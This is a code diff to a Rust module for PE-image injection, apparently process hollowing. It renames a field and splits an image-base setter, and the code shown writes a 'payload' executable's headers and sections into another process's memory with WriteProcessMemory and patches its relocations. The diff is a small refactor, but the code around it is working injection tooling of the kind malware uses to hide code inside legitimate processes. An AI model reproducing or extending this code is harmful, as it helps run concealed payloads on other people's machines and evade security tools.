@@ -46,7 +46,7 @@ pub struct LOADED_IMAGE {
 }
 
 pub struct PE_Container {
-    pub target_base: *mut c_void,
+    pub target_image_base: *mut c_void,
     pub payload_image: LOADED_IMAGE,
     pub payload_buffer: *mut c_void,
 }
@@ -56,7 +56,7 @@ impl PE_Container {
         let image = unsafe { read_image(payload_buffer) };
 
         PE_Container {
-            target_base: target_image_base,
+            target_image_base: target_image_base,
             payload_image: image,
             payload_buffer,
         }
@@ -79,7 +79,11 @@ impl PE_Container {
         }
     }
 
-    pub fn change_imabe_base(&self, new_image_base: *mut c_void) {
+    pub fn change_target_imabe_base(&mut self, new_image_base: *mut c_void) {
+        self.target_image_base = new_image_base;
+    }
+
+    pub fn change_payload_imabe_base(&self, new_image_base: *mut c_void) {
         unsafe { (*self.payload_image.FileHeader).OptionalHeader.ImageBase = new_image_base as _ };
     }
 
@@ -87,7 +91,7 @@ impl PE_Container {
         if unsafe {
             WriteProcessMemory(
                 hp,
-                self.target_base as _,
+                self.target_image_base as _,
                 self.payload_buffer,
                 (*self.payload_image.FileHeader)
                     .OptionalHeader
@@ -105,7 +109,7 @@ impl PE_Container {
         let sections = self.get_payload_section_headers();
 
         for section in sections {
-            let p_dest_section = self.target_base as usize + section.VirtualAddress as usize;
+            let p_dest_section = self.target_image_base as usize + section.VirtualAddress as usize;
             if unsafe {
                 WriteProcessMemory(
                     hp,
@@ -212,7 +216,7 @@ impl PE_Container {
 
                         if ReadProcessMemory(
                             hp,
-                            (self.target_base as usize + field_address) as PVOID,
+                            (self.target_image_base as usize + field_address) as PVOID,
                             &mut d_buffer as *const _ as *mut _,
                             size_of::<usize>(),
                             null_mut(),
@@ -229,7 +233,7 @@ impl PE_Container {
 
                         if WriteProcessMemory(
                             hp,
-                            (self.target_base as usize + field_address) as PVOID,
+                            (self.target_image_base as usize + field_address) as PVOID,
                             &mut d_buffer as *const _ as *mut _,
                             size_of::<usize>(),
                             null_mut(),
